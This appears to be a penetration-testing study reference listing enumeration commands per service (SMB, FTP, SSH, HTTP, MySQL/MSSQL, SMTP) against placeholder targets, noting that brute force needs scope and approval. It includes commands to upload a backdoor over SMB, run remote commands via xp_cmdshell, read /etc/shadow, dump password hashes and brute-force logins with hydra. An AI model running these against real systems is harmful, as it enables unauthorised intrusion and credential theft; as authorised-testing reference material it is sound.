# Enumeration

> Status: ✅ Reference complete
> Date started: 2026-10-27
> Date finished: 2026-10-27

## 1. Goal
Dig into each discovered service for shares, users, versions, creds and misconfigs. Placeholders: `<TARGET_IP>`, `<USER>`, `<PW>`, `<USERS_LIST>`. Brute-force is intrusive — scope + approval only.

## SMB (139/445)
```bash
# nmap scripts
sudo nmap -p 445 -sV -sC -O <TARGET_IP>
nmap -sU --top-ports 25 --open <TARGET_IP>
nmap -p 445 --script smb-protocols <TARGET_IP>
nmap -p 445 --script smb-security-mode <TARGET_IP>
nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-domains --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-groups --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-os-discovery <TARGET_IP>
nmap -p445 --script=smb-vuln-* <TARGET_IP>

nmblookup -A <TARGET_IP>

# smbmap
smbmap -u guest -p "" -d . -H <TARGET_IP>
smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'          # run a command
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L                      # list drives
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$'                 # list dir
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/backdoor' 'C$\backdoor'
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'

# smbclient
smbclient -L <TARGET_IP> -N                  # null session list
smbclient -L <TARGET_IP> -U <USER>
smbclient //<TARGET_IP>/<share> -U <USER>    # then: help / ls / get <file>
smbclient //<TARGET_IP>/public -N

# rpcclient
rpcclient -U "" -N <TARGET_IP>               # then: enumdomusers / enumdomgroups / lookupnames admin

# enum4linux
enum4linux -o <TARGET_IP>                    # OS  (-U users / -S shares / -G groups / -i printers)
enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
enum4linux -U -M -S -P -G <TARGET_IP>

# NULL session check → list/connect/download
enum4linux -n <TARGET_IP>                    # look for <20>
smbclient -L WORKGROUP -I <TARGET_IP> -N -U ""
smbclient \\\\<TARGET_IP>\\c$ -N -U ""        # then: get file_shared.txt

# brute force
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb

# metasploit
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login        # set SMBUser / PASS_FILE / RHOSTS
use auxiliary/scanner/smb/pipe_auditor
```

## FTP (21)
```bash
sudo nmap -p 21 -sV -sC -O <TARGET_IP>
nmap -p 21 --script ftp-anon <TARGET_IP>
nmap -p 21 --script ftp-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
ftp <TARGET_IP>                              # ls / cd / get / put
hydra -L common_users.txt -P unix_passwords.txt <TARGET_IP> -t 4 ftp
```

## SSH (22)
```bash
sudo nmap -p 22 -sV -sC -O <TARGET_IP>
nmap -p 22 --script ssh2-enum-algos <TARGET_IP>
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full <TARGET_IP>
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <TARGET_IP>
nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=<USER>, ssh-run.password=<PW>" <TARGET_IP>
nmap -p 22 --script=ssh-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
ssh <USER>@<TARGET_IP>
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
use auxiliary/scanner/ssh/ssh_login          # set USERPASS_FILE / STOP_ON_SUCCESS true
```

## HTTP (80/443)
```bash
sudo nmap -p 80 -sV -O <TARGET_IP>
nmap -p 80 --script=http-enum -sV <TARGET_IP>
nmap -p 80 --script=http-headers -sV <TARGET_IP>
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>
whatweb <TARGET_IP> ; curl -I http://<TARGET_IP>/<DIR> ; lynx <TARGET_IP>
dirb http://<TARGET_IP>
# brute HTTP auth forms:
hydra -L users.txt -P rockyou.txt example.com http-head /admin/     # basic auth
hydra -L users.txt -P rockyou.txt example.com http-get /admin/      # digest
hydra -l admin -P rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
# metasploit scanners:
use auxiliary/scanner/http/brute_dirs|robots_txt|http_header|http_login|http_version
```

## SQL (MySQL 3306 / MSSQL 1433)
```bash
sudo nmap -p 3306 -sV -O <TARGET_IP>
nmap -p 3306 --script=mysql-empty-password|mysql-info <TARGET_IP>
nmap -p 3306 --script=mysql-users|mysql-databases|mysql-variables --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>
nmap -p 3306 --script=mysql-dump-hashes --script-args="username='<USER>',password='<PW>'" <TARGET_IP>
nmap -p 3306 --script=mysql-query --script-args="query='select ...',username='<USER>',password='<PW>'" <TARGET_IP>
# MSSQL
nmap -sV -sC -p 1433 <TARGET_IP>
nmap -p 1433 --script ms-sql-info|ms-sql-ntlm-info|ms-sql-empty-password <TARGET_IP>
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="ipconfig" <TARGET_IP>
# client
mysql -h <TARGET_IP> -u root                 # show databases; use <db>; select load_file("/etc/shadow");
hydra -l <USER> -P unix_passwords.txt <TARGET_IP> mysql
use auxiliary/scanner/mysql/mysql_login|mysql_hashdump|mysql_schemadump
use auxiliary/scanner/mssql/mssql_login ; use auxiliary/admin/mssql/mssql_exec
```

## SMTP (25)
```bash
sudo nmap -p 25 -sV -sC -O <TARGET_IP>
nmap -sV -script banner <TARGET_IP>
nc <TARGET_IP> 25 ; telnet <TARGET_IP> 25    # HELO/EHLO attacker.xyz
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <TARGET_IP>
use auxiliary/scanner/smtp/smtp_enum
```

> Flow per service: nmap version+scripts → try null/anon/default creds → enumerate users/shares/DBs → brute only if needed and approved → note every version string for Vulnerability Assessment.
